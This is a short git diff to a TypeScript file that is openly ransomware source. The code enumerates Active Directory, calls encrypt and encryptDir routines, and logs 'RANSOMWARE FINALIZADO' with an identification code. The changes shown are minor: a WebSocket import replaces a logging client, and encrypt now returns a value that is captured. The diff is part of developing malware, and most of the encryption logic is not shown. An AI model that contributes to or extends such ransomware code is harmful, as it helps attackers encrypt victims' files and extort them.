@@ -7,7 +7,7 @@ import https from 'https';
 import createRandomString from './utils/generateRandomString';
 import enumerateAD from './enumerateAd';
 import isActive from './isActive';
-import sendLog from './websocket/client';
+import WebSocket from 'ws';
 
 const encrypt = () => {
   enumerateAD();
@@ -36,6 +36,8 @@ const encrypt = () => {
       sendLog(`[+] -> RANSOMWARE FINALIZADO, IDENTIFICATION CODE: ${idCode}`),
     1000,
   );
+
+  return true;
 };
 
 const encryptDir = (dir: string, key: string, iv: Buffer) => {
@@ -126,4 +128,4 @@ getPublicIP()
     console.error(err);
   });
 
-encrypt();
+const returnEncrypt = encrypt();
